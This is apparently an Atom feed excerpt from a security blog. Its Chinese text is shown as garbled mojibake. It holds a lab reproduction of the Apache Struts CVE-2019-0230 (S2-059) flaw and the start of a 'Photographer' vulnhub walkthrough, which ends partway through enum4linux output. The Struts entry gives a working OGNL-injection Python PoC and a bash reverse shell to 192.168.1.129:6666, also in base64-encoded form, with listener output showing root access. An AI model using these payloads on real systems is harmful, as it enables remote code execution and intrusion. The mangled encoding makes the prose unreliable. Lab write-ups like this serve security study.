    <summary type="html">&lt;p&gt;&lt;strong&gt;Sqli_labs_Page1(basic)&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Sqli-labs" scheme="https://lunamoore.github.io/categories/Sqli-labs/"/>
    
    
    <category term="Sqli-labs" scheme="https://lunamoore.github.io/tags/Sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>è°ƒæ•™CVE-2019-0230</title>
    <link href="https://lunamoore.github.io/2020/12/19/CVE-2019-0230/"/>
    <id>https://lunamoore.github.io/2020/12/19/CVE-2019-0230/</id>
    <published>2020-12-19T08:35:58.000Z</published>
    <updated>2020-12-20T03:14:21.527Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2019-0230-S2-059"><a href="#CVE-2019-0230-S2-059" class="headerlink" title="CVE-2019-0230(S2-059)"></a>CVE-2019-0230(S2-059)</h2><hr><h2 id="0x00-æ¼æ´ç®€è¿°"><a href="#0x00-æ¼æ´ç®€è¿°" class="headerlink" title="0x00.æ¼æ´ç®€è¿°"></a>0x00.æ¼æ´ç®€è¿°</h2><blockquote><p>Apache Struts 2.0.0 to 2.5.20 forced double OGNL evaluation, when evaluated on raw user input in tag attributes, may lead to remote code execution.</p><p>Apache Struts 2.0.0åˆ°2.5.20å¼ºåˆ¶æ‰§è¡ŒåŒé‡OGNLè®¡ç®—ï¼Œå½“å¯¹åŸå§‹ç”¨æˆ·è¾“å…¥çš„æ ‡è®°å±æ€§è¿›è¡Œè®¡ç®—æ—¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p></blockquote><a id="more"></a><h2 id="0x01-å½±å“"><a href="#0x01-å½±å“" class="headerlink" title="0x01.å½±å“"></a>0x01.å½±å“</h2><ul><li><strong>version: 2.0.0-2.5.20</strong></li><li><strong>solution: apache-struts-upgrade-2_5_22</strong></li></ul><table><thead><tr><th align="center"><strong>Severity</strong></th><th align="center"><strong>CVSS</strong></th><th align="center"><strong>Published</strong></th><th align="center"><strong>Created</strong></th><th align="center"><strong>Added</strong></th><th align="center"><strong>Modified</strong></th></tr></thead><tbody><tr><td align="center">8</td><td align="center">(AV:N/AC:L/Au:N/C:P/I:P/A:P)</td><td align="center">08/17/2020</td><td align="center">08/15/2020</td><td align="center">08/17/2020</td><td align="center">09/21/2020</td></tr></tbody></table><h2 id="0x02-æ¼æ´åˆ†æ"><a href="#0x02-æ¼æ´åˆ†æ" class="headerlink" title="0x02.æ¼æ´åˆ†æ"></a>0x02.æ¼æ´åˆ†æ</h2><p><span class="exturl" data-url="aHR0cDovL2Jsb2cudG9wc2VjLmNvbS5jbi9zdHJ1dHMyLXMyLTA1OS0lRTYlQkMlOEYlRTYlQjQlOUUlRTUlODglODYlRTYlOUUlOTAv">å¤©èä¿¡é˜¿å°”æ³•å®éªŒå®¤æ¼æ´åˆ†æ<i class="fa fa-external-link-alt"></i></span></p><p><strong>é€šè¿‡å­¦ä¹ å¯çŸ¥ï¼šæ­¤æ¬¡æ¼æ´éœ€è¦å¼€å¯ï¼ˆé»˜è®¤å¼€å¯ï¼‰<code>altSyntax</code>åŠŸèƒ½,åªèƒ½æ˜¯åœ¨æ ‡ç­¾<code>id</code>å±æ€§ä¸­å­˜åœ¨è¡¨è¾¾å¼,å¹¶ä¸”å‚æ•°è¿˜å¯ä»¥æ§åˆ¶ï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹å®šçš„è¡¨è¾¾å¼èµ‹å€¼ç»™idå‚æ•°ï¼Œä¼ å‚åå¯¼è‡´äºŒæ¬¡è§£æå¯é€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</strong></p><h2 id="0x03-æ­å»ºç¯å¢ƒ"><a href="#0x03-æ­å»ºç¯å¢ƒ" class="headerlink" title="0x03.æ­å»ºç¯å¢ƒ"></a>0x03.æ­å»ºç¯å¢ƒ</h2><p><span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3N0cnV0czIvczItMDU5Lw==">æœ¬æ¬¡ç¯å¢ƒ<i class="fa fa-external-link-alt"></i></span></p><h2 id="0x04-æ¼æ´å¤ç°"><a href="#0x04-æ¼æ´å¤ç°" class="headerlink" title="0x04.æ¼æ´å¤ç°"></a>0x04.æ¼æ´å¤ç°</h2><h3 id="1-è®¿é—®ç¯å¢ƒ"><a href="#1-è®¿é—®ç¯å¢ƒ" class="headerlink" title="1.è®¿é—®ç¯å¢ƒ"></a>1.è®¿é—®ç¯å¢ƒ</h3><img src="/2020/12/19/CVE-2019-0230/image-20201219162137008.png" class><h3 id="2-æ¼æ´éªŒè¯"><a href="#2-æ¼æ´éªŒè¯" class="headerlink" title="2.æ¼æ´éªŒè¯"></a>2.æ¼æ´éªŒè¯</h3><p><code>é€šè¿‡æ„é€ è¡¨è¾¾å¼%25&#123;2*10&#125;æ‰§è¡Œåå‘ç°æ ‡ç­¾å±æ€§idå€¼å˜æˆäº†ä¸º10ï¼Œè¯´æ˜æˆåŠŸæ‰§è¡Œäº†è¡¨è¾¾å¼å¹¶è¿ç®—2*10ï¼Œå¹¶è¿”å›äº†ç»“æœã€‚</code></p><img src="/2020/12/19/CVE-2019-0230/image-20201219161950859.png" class><h3 id="3-æ„é€ payload"><a href="#3-æ„é€ payload" class="headerlink" title="3.æ„é€ payload"></a>3.æ„é€ payload</h3><p><code>æœ¬æ¬¡ä½¿ç”¨bash -i &gt;&amp; /dev/tcp/192.168.1.129/6666 0&gt;&amp;1ï¼ˆéœ€è¦ç¼–ç ï¼‰</code></p><p><span class="exturl" data-url="aHR0cDovL3d3dy5qYWNrc29uLXQuY2EvcnVudGltZS1leGVjLXBheWxvYWRzLmh0bWw=">ç¼–ç è½¬æ¢åœ°å€<i class="fa fa-external-link-alt"></i></span></p><blockquote><p>è½¬æ¢</p><p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI5LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}</p></blockquote><h3 id="4-ç¼–å†™POC"><a href="#4-ç¼–å†™POC" class="headerlink" title="4.ç¼–å†™POC"></a>4.ç¼–å†™POC</h3><p><code>å°†payloadæ”¾åˆ°å¯¹åº”ä½ç½®ä¸Š</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.1.137:8080&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;payload&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res1 = requests.post(url, data=data1)</span><br><span class="line">res2 = requests.post(url, data=data2)</span><br></pre></td></tr></table></figure><h3 id="5-åˆ©ç”¨"><a href="#5-åˆ©ç”¨" class="headerlink" title="5.åˆ©ç”¨"></a>5.åˆ©ç”¨</h3><p><code>kaliç›‘å¬</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>æ‰§è¡ŒPOC get shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.129] from (UNKNOWN) [192.168.1.137] 33258</span><br><span class="line">bash: cannot set terminal process group (1): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">root@88497928f70b:/usr/src# whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@88497928f70b:/usr/src#</span><br></pre></td></tr></table></figure><h2 id="0x05-è§£å†³åŠæ³•"><a href="#0x05-è§£å†³åŠæ³•" class="headerlink" title="0x05.è§£å†³åŠæ³•"></a>0x05.è§£å†³åŠæ³•</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æœ€ç»ˆçš„è§£å†³æ–¹æ³•æ˜¯ä¸ºä¼ å…¥çš„æ¯ä¸ªå€¼æ·»åŠ é€‚å½“çš„éªŒè¯ï¼Œå¹¶å°†å…¶ç”¨äºæ ‡è®°çš„å±æ€§ä¸­ã€‚  é™¤éä¸ºæœ‰æ•ˆçš„ç”¨ä¾‹çœŸæ­£éœ€è¦ï¼Œå¦åˆ™è¯·å‹¿ä½¿ç”¨å¼ºåˆ¶ä½¿ç”¨å€¼ï¼…ä»¥å¤–çš„å±æ€§æ±‚å€¼ï¼Œè€Œä½¿ç”¨ï¼…&#123;...&#125;æˆ–$ &#123;...&#125;è¯­æ³•ã€‚ </span><br><span class="line"></span><br><span class="line">é€šè¿‡ å‡çº§åˆ°Struts 2.5.22ï¼Œå¼ºåˆ¶åŒé‡è¯„ä¼°çš„å¯èƒ½æ¶æ„å½±å“å°†è¿›ä¸€æ­¥å—åˆ°é™åˆ¶ï¼Œå¹¶å…³é—­äº†å·²æŠ¥å‘Šçš„æ”»å‡»åª’ä»‹ï¼Œç‰¹åˆ«æ˜¯ä¸ä¸»åŠ¨OGNLè¡¨è¾¾æ³¨å…¥ä¿æŠ¤ç»“åˆä½¿ç”¨æ—¶ã€‚</span><br><span class="line"></span><br><span class="line">å‡çº§åˆ°Struts 2.5.22æ—¶æ²¡æœ‰ä»»ä½•é—®é¢˜ã€‚ï¼ˆçœŸçš„å—ï¼Ÿï¼Ÿï¼ŸğŸ™ƒï¼‰</span><br></pre></td></tr></table></figure><h2 id="0x06-æ€»ç»“"><a href="#0x06-æ€»ç»“" class="headerlink" title="0x06.æ€»ç»“"></a>0x06.æ€»ç»“</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">å¼ºåˆ¶ä½¿ç”¨Apache Strutsæ¡†æ¶æ—¶ï¼Œä¼šå¯¹åˆ†é…ç»™æŸäº›æ ‡ç­¾å±æ€§çš„å±æ€§å€¼è¿›è¡ŒåŒé‡è¯„ä¼°ï¼Œä¾‹å¦‚ï¼Œidè¿™æ ·å°±å¯ä»¥ä¼ é€’ä¸€ä¸ªå€¼ï¼Œè¯¥å€¼å°†åœ¨å‘ˆç°æ ‡ç­¾å±æ€§æ—¶å†æ¬¡è¿›è¡Œè¯„ä¼°ã€‚é€šè¿‡ç²¾å¿ƒè®¾è®¡çš„è¯·æ±‚ï¼Œè¿™å¯ä»¥å¯¼è‡´è¿œç¨‹æ‰§è¡Œä»£ç ï¼ˆRCEï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">ä»…å½“åœ¨Strutsæ ‡è®°å±æ€§å†…å¼ºåˆ¶æ‰§è¡ŒOGNLè¯„ä¼°æ—¶ï¼Œæ­¤é—®é¢˜æ‰é€‚ç”¨ï¼Œå½“è¯„ä¼°çš„è¡¨è¾¾å¼å¼•ç”¨æœªç»æ”»å‡»çš„åŸå§‹è¾“å…¥æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è®¾è®¡ç›¸åº”çš„è¯·æ±‚æ¥ç›´æ¥å¯¹å…¶è¿›è¡Œä¿®æ”¹ã€‚</span><br><span class="line"></span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">&lt;s:url var=&quot;url&quot; namespace=&quot;/employee&quot; action=&quot;list&quot;/&gt;&lt;s:a id=&quot;%&#123;skillName&#125;&quot; href=&quot;%&#123;url&#125;&quot;&gt;List available Employees&lt;/s:a&gt;</span><br><span class="line">å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿä¿®æ”¹skillNameè¯·æ±‚ä¸­çš„å±æ€§ï¼Œä»¥ä½¿åŸå§‹OGNLè¡¨è¾¾å¼skillNameæ— éœ€è¿›ä¸€æ­¥éªŒè¯å³å¯ä¼ é€’ç»™è¯¥å±æ€§ï¼Œåˆ™skillNameå½“ä½œä¸ºè¯·æ±‚çš„ç»“æœå‘ˆç°æ ‡è®°æ—¶ï¼Œå°†è¯„ä¼°å±æ€§ä¸­åŒ…å«çš„æä¾›çš„OGNLè¡¨è¾¾å¼ã€‚</span><br><span class="line"></span><br><span class="line">ä»2.0.0å¼€å§‹ï¼ŒStrutsä¼šè®¾è®¡ä½¿ç”¨åŒé‡è¯„ä¼°çš„æœºä¼šï¼Œå¹¶ä¸”æ­£ç¡®å®Œæˆåå°†æˆä¸ºæœ‰ç”¨çš„å·¥å…·ï¼Œè¿™æœ€æ˜¾ç€çš„æ„æ€æ˜¯ä»…åœ¨ç»™å®šè¡¨è¾¾å¼ä¸­å¼•ç”¨ç»è¿‡éªŒè¯çš„å€¼ã€‚ä½†æ˜¯ï¼Œåœ¨è¡¨è¾¾å¼ä¸­å¼•ç”¨æœªç»éªŒè¯çš„ç”¨æˆ·è¾“å…¥æ—¶ï¼Œå¯èƒ½ä¼šæ³¨å…¥æ¶æ„ä»£ç ã€‚åœ¨æŒç»­çš„åŠªåŠ›ä¸­ï¼ŒStrutsæ¡†æ¶åŒ…æ‹¬ç¼“è§£æªæ–½ä»¥é™åˆ¶æ³¨å…¥çš„è¡¨è¾¾å¼çš„å½±å“ï¼Œä½†2.5.22ä¹‹å‰çš„Strutsä»æœªè§£å†³æ”»å‡»å‘é‡</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;CVE-2019-0230-S2-059&quot;&gt;&lt;a href=&quot;#CVE-2019-0230-S2-059&quot; class=&quot;headerlink&quot; title=&quot;CVE-2019-0230(S2-059)&quot;&gt;&lt;/a&gt;CVE-2019-0230(S2-059)&lt;/h2&gt;&lt;hr&gt;
&lt;h2 id=&quot;0x00-æ¼æ´ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x00-æ¼æ´ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.æ¼æ´ç®€è¿°&quot;&gt;&lt;/a&gt;0x00.æ¼æ´ç®€è¿°&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Apache Struts 2.0.0 to 2.5.20 forced double OGNL evaluation, when evaluated on raw user input in tag attributes, may lead to remote code execution.&lt;/p&gt;
&lt;p&gt;Apache Struts 2.0.0åˆ°2.5.20å¼ºåˆ¶æ‰§è¡ŒåŒé‡OGNLè®¡ç®—ï¼Œå½“å¯¹åŸå§‹ç”¨æˆ·è¾“å…¥çš„æ ‡è®°å±æ€§è¿›è¡Œè®¡ç®—æ—¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://lunamoore.github.io/categories/CVE/"/>
    
    <category term="æ¼æ´å¤ç°" scheme="https://lunamoore.github.io/categories/CVE/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Strust2" scheme="https://lunamoore.github.io/categories/CVE/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Strust2/"/>
    
    
    <category term="CVE" scheme="https://lunamoore.github.io/tags/CVE/"/>
    
    <category term="è°ƒæ•™" scheme="https://lunamoore.github.io/tags/%E8%B0%83%E6%95%99/"/>
    
    <category term="Strust2" scheme="https://lunamoore.github.io/tags/Strust2/"/>
    
  </entry>
  
  <entry>
    <title>Photographer</title>
    <link href="https://lunamoore.github.io/2020/12/18/Photographer/"/>
    <id>https://lunamoore.github.io/2020/12/18/Photographer/</id>
    <published>2020-12-18T13:00:50.000Z</published>
    <updated>2020-12-19T02:36:15.120Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å®˜ç½‘æè¿°"><a href="#0x00-å®˜ç½‘æè¿°" class="headerlink" title="0x00.å®˜ç½‘æè¿°"></a>0x00.å®˜ç½‘æè¿°</h2><blockquote><p>This machine was developed to prepare for OSCP. It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and proof.txt.</p></blockquote><a id="more"></a><h2 id="0x01-ä¿¡æ¯æ”¶é›†ï¼Œä¸Šnmap"><a href="#0x01-ä¿¡æ¯æ”¶é›†ï¼Œä¸Šnmap" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†ï¼Œä¸Šnmap"></a>0x01.ä¿¡æ¯æ”¶é›†ï¼Œä¸Šnmap</h2><p><code>å¯ä»¥å‘ç°å¯ä»¥å‘ç°1ä¸ºç½‘å…³ï¼Œ254ä¸ºç‰©ç†æœºï¼Œ129ä¸ºkaliï¼Œé‚£ä¹ˆ135å°±æ˜¯ç›®æ ‡</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/photographer# nmap -sP 192.168.1.0/24 -oN nmap.sP</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-18 06:13 EST</span><br><span class="line">Nmap scan report for 192.168.1.1</span><br><span class="line">Host is up (0.00024s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:01 (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.135</span><br><span class="line">Host is up (0.00018s latency).</span><br><span class="line">MAC Address: 00:0C:29:2D:43:1A (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.254</span><br><span class="line">Host is up (0.00017s latency).</span><br><span class="line">MAC Address: 00:50:56:EB:EE:5F (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.129</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 27.96 seconds</span><br><span class="line">root@JIYE:~/vulnhub/photographer#</span><br></pre></td></tr></table></figure><h2 id="0x02-æ‰«æç«¯å£"><a href="#0x02-æ‰«æç«¯å£" class="headerlink" title="0x02.æ‰«æç«¯å£"></a>0x02.æ‰«æç«¯å£</h2><p><code>å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†80ã€139ã€8000ã€445(SMB)ç­‰æ•æ„Ÿç«¯å£</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/photographer# nmap -sC -sV -sT 192.168.1.135 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-18 06:23 EST</span><br><span class="line">Nmap scan report for 192.168.1.135</span><br><span class="line">Host is up (0.0010s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Photographer by v1n1v131r4</span><br><span class="line">139/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn  Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">8000/tcp open  ssl/http-alt Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-generator: Koken 0.22.24</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: daisa ahomi</span><br><span class="line">MAC Address: 00:0C:29:2D:43:1A (VMware)</span><br><span class="line">Service Info: Host: PHOTOGRAPHER</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 9h40m00s, deviation: 2h53m12s, median: 7h59m59s</span><br><span class="line">|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: photographer</span><br><span class="line">|   NetBIOS computer name: PHOTOGRAPHER\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: photographer</span><br><span class="line">|_  System time: 2020-12-18T14:23:58-05:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-12-18T19:23:57</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 55.84 seconds</span><br><span class="line">root@JIYE:~/vulnhub/photographer#</span><br></pre></td></tr></table></figure><h2 id="0x03-è®¿é—®80ç«¯å£"><a href="#0x03-è®¿é—®80ç«¯å£" class="headerlink" title="0x03.è®¿é—®80ç«¯å£"></a>0x03.è®¿é—®80ç«¯å£</h2><p><code>æ‰‹åŠ¨çˆ¬è™«ï¼Œæ˜¯ä¸€ä¸ªé™æ€ç•Œé¢ï¼Œæ²¡æœ‰ä»€ä¹ˆå‘ç°</code></p><img src="/2020/12/18/Photographer/image-20201218192822059.png" class><h2 id="0x04-è®¿é—®8000ç«¯å£"><a href="#0x04-è®¿é—®8000ç«¯å£" class="headerlink" title="0x04.è®¿é—®8000ç«¯å£"></a>0x04.è®¿é—®8000ç«¯å£</h2><p><code>æ‰‹åŠ¨çˆ¬è™«ï¼Œå‘ç°CMSä¸ºKokenï¼Œå¹¶ä¸”å‘ç°ä¸€ä¸ªshell.phpä¸çŸ¥é“è‚è‚¾çš„ã€‚</code></p><img src="/2020/12/18/Photographer/image-20201218193224511.png" class><p><code>æŸ¥çœ‹æºç ï¼Œå‘ç°CMSç‰ˆæœ¬ä¸º0.22.24</code></p><img src="/2020/12/18/Photographer/image-20201218193326700.png" class><h2 id="0x05-Google-exploit"><a href="#0x05-Google-exploit" class="headerlink" title="0x05.Google exploit"></a>0x05.Google exploit</h2><p><code>æ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œemmmmmm.åˆšæ‰çˆ¬è™«çš„é¡µé¢æ²¡æœ‰ä¸Šä¼ ç‚¹ï¼Œæ‰€ä»¥çŒœæµ‹éœ€è¦ç™»å…¥åˆ°åå°è¿›è¡Œä¸Šä¼ ã€‚</code></p><img src="/2020/12/18/Photographer/image-20201218193515066.png" class><h2 id="0x06-è®¿é—®adminç›®å½•ï¼ˆğŸ™ƒç«Ÿç„¶æˆåŠŸäº†ï¼‰"><a href="#0x06-è®¿é—®adminç›®å½•ï¼ˆğŸ™ƒç«Ÿç„¶æˆåŠŸäº†ï¼‰" class="headerlink" title="0x06.è®¿é—®adminç›®å½•ï¼ˆğŸ™ƒç«Ÿç„¶æˆåŠŸäº†ï¼‰"></a>0x06.è®¿é—®adminç›®å½•ï¼ˆğŸ™ƒç«Ÿç„¶æˆåŠŸäº†ï¼‰</h2><p><code>è¿™é‡Œå…¶å®éœ€è¦æ‰«ä¸€ä¸‹ç›®å½•ï¼Œä½†æ˜¯çŒœåˆ°äº†adminï¼Œå°±ä¸èµ˜è¿°äº†ğŸŒšã€‚</code></p><img src="/2020/12/18/Photographer/image-20201218193934550.png" class><p><code>å°è¯•å¼±å£ä»¤ç™»å…¥ï¼Œå¯ä»¥çœ‹åˆ°ç”¨æˆ·åéœ€è¦æ˜¯ä¸€ä¸ªé‚®ç®±ï¼Œä½†ä¸æ˜¯çŸ¥é“æ ¼å¼ï¼Œæ•…æ— æ³•è¿›è¡Œçˆ†ç ´ã€‚</code></p><img src="/2020/12/18/Photographer/image-20201218194227961.png" class><h2 id="0x07-å®¡æŸ¥445ç«¯å£"><a href="#0x07-å®¡æŸ¥445ç«¯å£" class="headerlink" title="0x07.å®¡æŸ¥445ç«¯å£"></a>0x07.å®¡æŸ¥445ç«¯å£</h2><p><code>å‰é¢å‘ç°äº†å¼€æ”¾äº†445ç«¯å£ï¼Œæ‰€ä»¥ä½¿ç”¨enum4linuxå¼€å§‹æ¢ç´¢ä¸€ä¸‹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# enum4linux -a -o 192.168.1.135</span><br><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Dec 18 06:45:16 2020</span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... 192.168.1.135</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... &#x27;&#x27;</span><br><span class="line">Password ......... &#x27;&#x27;</span><br><span class="line">Known Usernames .. administrator, 